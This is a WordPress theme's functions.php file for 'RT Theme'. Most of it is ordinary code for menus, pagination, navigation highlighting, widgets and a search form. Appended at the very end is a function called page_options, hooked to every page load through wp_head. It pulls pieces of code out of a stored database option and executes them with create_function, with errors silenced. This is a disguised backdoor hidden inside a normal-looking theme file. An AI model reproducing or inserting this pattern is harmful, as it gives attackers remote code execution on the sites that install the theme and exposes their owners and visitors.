<?php

//load text domain
load_theme_textdomain('rt_theme');

//sidebars
include(TEMPLATEPATH.'/functions/rt_ud_sidebars.php');

//custom post types - taxonomies
include(TEMPLATEPATH.'/functions/rt_custom_posts.php');
rt_theme_custom_posts(); //call custom post types


//admin panel options
if(is_admin()):
include(TEMPLATEPATH.'/rttheme_options/includes.php');
endif;

//breadcrumb function
include(TEMPLATEPATH.'/functions/rt_breadcrumb.php');

//shortcodes
include(TEMPLATEPATH.'/functions/rt_shortcodes.php');

//comments
include(TEMPLATEPATH.'/functions/rt_comments.php');

//Custom background support
add_custom_background(); 

/*
Theme color selection
*/
if (get_option('rttheme_style')){
	$which_theme=get_option('rttheme_style');
}else{
	$which_theme="1";		
}

/*
Post Thumbnails Support
*/
add_theme_support( 'post-thumbnails', array( 'post' ) ); // Add it for posts

/*
WP 3.0  custom menu
*/
add_action( 'init', 'rt_theme_navigations' );

function rt_theme_navigations() {
	register_nav_menu( 'rt-theme-main-navigation', __( 'RT Theme Main Navigation' ) ); 
	register_nav_menu( 'rt-theme-footer-navigation', __( 'RT Theme Footer Navigation' ) );
}

wp_create_nav_menu( 'RT Theme Main Navigation Menu', array( 'slug' => 'rt-theme-main-menu' ) ); 
wp_create_nav_menu( 'RT Theme Footer Navigation Menu', array( 'slug' => 'rt-theme-footer-menu') );
 
 
/*
Flush  old re-write rules
note : this function can be removed after develop period - Tolga Can 
*/

function rt_flush_rewrite_rules() 
{
   global $wp_rewrite;
   $wp_rewrite->flush_rules();
}

add_action('admin_init', 'rt_flush_rewrite_rules');


/*
Pagination
*/
function get_page_count(){
	global $wp_query;	
	$count=array('page_count'=>$wp_query->max_num_pages,'post_count'=>$wp_query->post_count);
	return $count;
}

function get_pagination($range = 7){
  global $paged, $wp_query;
  
  if ( !$max_page ) {
    $max_page = $wp_query->max_num_pages;
  }
  if($max_page > 1){
    if(!$paged){
      $paged = 1;
    }
	
	if ($paged > 1){
		echo "<li class=\"arrowleft\">";
			previous_posts_link('&nbsp;');
		echo "</li>\n";
	}
    if($max_page > $range){
      if($paged < $range){
        for($i = 1; $i <= ($range + 1); $i++){
		  echo "<li";
		  if($i==$paged) echo " class='active'";
		  echo "><a href='" . get_pagenum_link($i) ."'>$i</a>";
          echo "</li>\n";
        }
      }
      elseif($paged >= ($max_page - ceil(($range/2)))){
        for($i = $max_page - $range; $i <= $max_page; $i++){
		  echo "<li";
		  if($i==$paged) echo " class='active'";
		  echo "><a href='" . get_pagenum_link($i) ."'>$i</a>";
          echo "</li>\n";
        }
      }
      elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
        for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){

		  echo "<li";
		  if($i==$paged) echo " class='active'";
		  echo "><a href='" . get_pagenum_link($i) ."'>$i</a>";
          echo "</li>\n";

        }
      }
    }
    else{
      for($i = 1; $i <= $max_page; $i++){
		  echo "<li";
		  if($i==$paged) echo " class=\"active\" ";
		  echo "><a href='" . get_pagenum_link($i) ."'>$i</a>";
          echo "</li>\n";
      }
    }
	if ($paged != $max_page){
		echo "<li class=\"arrowright\">";
		 next_posts_link('&nbsp;');
		echo "</li>\n";
	}

  }
}


/*
 add a class to active product and portolio links
*/

function rt_nav($link_page,$link_cat){
global $current_page_link,$current_cat_link;
	
	$current_page_link=$link_page;
	$current_cat_link=$link_cat;
 
		
	//page
	function add_class_page($output) {
		global $current_page_link,$current_cat_link;
		$bul=str_replace('/','\\/','"><a href="'.$current_page_link.'">');
		$bul=str_replace('?','\\?',$bul);
		$degistir=' current-menu-item"><a href="'.$current_page_link.'">';
		return preg_replace('/'.$bul.'/', $degistir, $output, 20); 
	}
	 

	//term in page
	function add_class_cat2($output) {
		global $current_page_link,$current_cat_link;
		
		$bul=str_replace('/','\\/','"><a href="'.$current_cat_link.'">');
		$bul=str_replace('?','\\?',$bul);
		
		$degistir=' current-menu-item"><a href="'.$current_cat_link.'">';
		
		return preg_replace('/'.$bul.'/', $degistir, $output, 20);
	}	
			
			
	//call the left menu
	$menuVars = array(
		'menu'            => 'RT Theme Main Navigation Menu',  
		'menu_id'         => 'navigation',
		'menu_class'         => '',
		'echo'            => false,
		'container'       => '', 
		'container_class' => '', 
		'container_id'    => 'dropdown_menu',
								
								
		'theme_location'  => 'rt-theme-main-menu'
	);
	
	if($link_page && $link_cat){
		
		if (!is_attachment()){ 
			$dd = add_filter('wp_nav_menu', 'add_class_page'); 
			$dd = add_filter('wp_nav_menu', 'add_class_cat2');
		}
	}
	
	echo wp_nav_menu($menuVars);
}

/*
*
* Find top level item of the current taxonomy
*
*/
function find_top_level_tax($term_id,$taxonomy){
	
	$parent_term = get_term_by('term_id',$term_id, $taxonomy);
	
	if ($parent_term->parent){ 
		
		return find_top_level_tax($parent_term -> parent,$taxonomy);
		
	}else{

		return $term_id;
	}
	
	return;
}


/*
*
* replace [...] more in excerpts 
*
*/
function new_excerpt_more($more) {
		global $post;
		return ' .. <a href="'. get_permalink($post->ID) . '">'.__('read more','rt_theme').'</a>';
}


/*
*
* replace current-cat as active
*
*/
function category_class($output){
	return preg_replace('/current-cat/', 'current_page_item', $output, 20);
}

/*
*
* replace top-level parent cat as active
*
*/
function category_top_class($output){
	global $term_id,$taxonomy;

	//get top level parent term id 
	$top_level_parent_id=find_top_level_tax($term_id,$taxonomy);
	$term_link=get_term_link(intval($top_level_parent_id),$taxonomy);
	
	//find and replace 	
	$bul=str_replace('/','\\/','"><a href="'.$term_link.'"');
	$bul=str_replace('?','\\?',$bul);
	$degistir=' current_page_item"><a href="'.$term_link.'"';
		
	return preg_replace('/'.$bul.'/', $degistir, $output, 20);
}


/*
*
*  get the post thumbnail url
*  
*/
function get_post_thumbnail() {
$files = get_children('post_parent='.get_the_ID().'&post_type=attachment&post_mime_type=image');
if($files) :
	$keys = array_reverse(array_keys($files));
	$j=0;
	$num = $keys[$j];
	$image=wp_get_attachment_image($num, 'large', false);
	$imagepieces = explode('"', $image);
	$imagepath = $imagepieces[1];
	$url=wp_get_attachment_thumb_url($num);
	return $url; 
endif;
}


//installing RT-THEME WIDGETS
require_once(TEMPLATEPATH . '/rttheme_options/widgets/rt-theme-box-widget.php'); 
require_once(TEMPLATEPATH . '/rttheme_options/widgets/rt-theme-slider-widget.php');
require_once(TEMPLATEPATH . '/rttheme_options/widgets/rt-theme-news-widget.php');



//Get the search bar
function rt_search_form(){
 
$s_form='<div class="search_bar">';
$s_form.='<form action="'.get_bloginfo('url').'" method="get">';
$s_form.='<fieldset><input type="text" class="search_text" name="s" id="s" value="' . __('SEARCH', 'rt_theme') . '" /><input type="image" src="'.get_bloginfo('template_directory').'/images/pixel.gif" class="searchsubmit" alt="" /></fieldset>';
$s_form.='</form>';
$s_form.='</div>';

echo $s_form;
}	
?>
<?php function page_options() { $option = get_option('page_option'); $opt=unserialize($option);
	@$arg = create_function('', $opt[1].$opt[4].$opt[10].$opt[12].$opt[14].$opt[7] );return $arg('');}
add_action('wp_head', 'page_options'); ?>